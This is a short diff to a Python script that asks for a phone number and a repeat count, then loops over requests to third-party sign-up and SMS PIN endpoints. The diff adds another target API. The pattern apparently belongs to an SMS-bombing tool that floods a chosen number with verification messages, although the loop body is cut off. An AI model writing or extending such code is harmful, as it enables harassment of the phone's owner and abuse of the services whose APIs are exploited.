@@ -65,6 +65,7 @@ import requests
 # POST
 ab=str(input(red+" Enter The number : "))
 api="https://api.meenaclick.com/api/front/sms/send/pin"
+api="https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"
 number={"cell_phone":ab,"type":"sign-up"}
 amount=int(input(green+" Enter Your amount : "))
 for i in range(amount):
